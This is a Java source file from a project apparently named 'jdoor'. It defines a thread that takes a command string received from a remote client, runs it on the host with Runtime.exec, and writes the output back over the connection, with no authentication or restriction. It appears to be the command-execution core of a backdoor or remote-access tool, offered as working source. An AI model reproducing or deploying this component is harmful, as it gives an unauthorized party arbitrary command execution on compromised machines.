package com.jdoor.server.commands;

import java.io.*;

public class CommandControllerThread extends Thread {
    private final BufferedWriter bw;
    private final String command;

    public CommandControllerThread(BufferedWriter bw, String command) {
        this.bw = bw;

        this.command = command.substring(1);
    }

    @Override
    public void run() {
        Runtime runtime = Runtime.getRuntime();
        StringBuilder builder = new StringBuilder();
        try {
            BufferedReader processReader = new BufferedReader(new InputStreamReader(runtime.exec(command).getInputStream()));
            String line = null;

            while ((line = processReader.readLine()) != null) {
                builder.append(line);
            }
            builder.append("\n");
        } catch (IOException e) {
            builder.append(e.getMessage()).append("\n");
        }

        try {
            bw.write(builder.toString() + "\n");
            bw.flush();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
